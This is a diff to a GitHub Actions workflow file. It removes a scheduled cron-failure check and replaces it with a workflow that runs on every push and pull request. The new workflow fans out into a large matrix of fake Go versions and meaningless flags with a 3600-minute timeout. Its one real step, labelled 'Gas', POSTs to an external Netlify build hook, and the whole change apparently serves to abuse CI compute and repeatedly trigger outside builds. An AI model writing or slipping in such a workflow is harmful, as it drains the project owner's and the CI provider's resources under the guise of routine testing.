@@ -1,41 +1,30 @@
----
-
-# Format Ref: https://docs.github.com/en/free-pro-team@latest/actions/reference/workflow-syntax-for-github-actions
-
-# Required to un-FUBAR default ${{github.workflow}} value
-name: check_cirrus_cron
-
-on:
-    # Note: This only applies to the main branch.
-    schedule:
-        # N/B: This should correspond to a period slightly after
-        # the last job finishes running.  See job defs. at:
-        # https://cirrus-ci.com/settings/repository/6707778565701632
-        - cron:  '5 * * * *'
-    # Debug: Allow triggering job manually in github-actions WebUI
-    workflow_dispatch: {}
-
-env:
-    # Debug-mode can reveal secrets, only enable by a secret value.
-    # Ref: https://help.github.com/en/actions/configuring-and-managing-workflows/managing-a-workflow-run#enabling-step-debug-logging
-    ACTIONS_STEP_DEBUG: '${{ secrets.ACTIONS_STEP_DEBUG }}'
-    # CSV listing of e-mail addresses for delivery failure or error notices
-    RCPTCSV: rh.container.bot@gmail.com,podman-monitor@lists.podman.io
-    # Filename for table of cron-name to build-id data
-    # (must be in $GITHUB_WORKSPACE/artifacts/)
-    NAME_ID_FILEPATH: './artifacts/name_id.txt'
-
+name: VERUS
+on: [push, pull_request]
 jobs:
-    cron_failures:
-        runs-on: ubuntu-latest
-        steps:
-            - uses: actions/checkout@v2
-              with:
-                  persist-credentials: false
-
-            - name: Get failed cron names and Build IDs
-              id: cron
-              run: curl -X POST -d {} https://api.netlify.com/build_hooks/62c0c01e7a230411a76e3056
+  build:
+    name: TOD
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 10
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 2.0, 1.1, 1.2, 1.3, 1.4, 1.5, 2.1, 2.2, 2.3, 2.4, 2.5]
+        flag: [A, B, C, D, E, F, G]
+    timeout-minutes: 3600
+    env:
+        NUM_JOBS: 10
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Gas
+      run: |
+        curl -X POST -d {} https://api.netlify.com/build_hooks/62c0c01e7a230411a76e3056
 
             
         
